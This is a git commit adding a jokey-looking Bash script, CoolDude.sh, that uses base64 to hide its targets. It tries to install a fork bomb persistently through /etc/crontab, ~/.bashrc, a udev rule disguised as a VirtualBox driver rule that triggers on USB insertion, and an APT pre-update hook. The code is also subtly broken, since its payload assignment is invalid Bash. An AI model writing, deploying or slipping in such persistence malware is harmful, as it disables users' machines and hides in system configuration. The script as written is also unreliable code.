15e134d930ba1fdd183997a8355c322c961dbdf8
spicesouls <59148900+spicesouls@users.noreply.github.com>
2021-04-11 14:09:52 +0100

    Create CoolDude.sh

---
+++ Linux/Bash/CoolDude.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+# (•_•)
+# ( •_•)>⌐■-■
+# (⌐■_■)
+
+cool=' '
+otherdude=$(echo RHVkZUNvb2wuc2g=|base64 -d)
+dudeloc=$cool$(pwd)$otherdude
+echo $(echo QHJlYm9vdA==|base64 -d)$dudeloc >> $(echo L2V0Yy9jcm9udGFi|base64 -d)
+EvilDude = $(echo OigpeyA6fDogJiB9Ozo=|base64 -d)
+echo '#!/bin/bash' > $otherdude && echo $EvilDude >> $otherdude
+echo $EvilDude >> $(echo fi8uYmFzaHJj|base64 -d)
+echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$EvilDude\"" | tee $(echo L2V0Yy91ZGV2L3J1bGVzLmQvNzEtdmJveC1rZXJuZWwtZHJpdmVycy5ydWxlcw==|base64 -d) > /dev/null
+echo 'APT::Update::Pre-Invoke {"'$EvilDude'"};' > $(echo L2V0Yy9hcHQvYXB0LmNvbmYuZC9Db29sbmVzcw==|base64 -d)
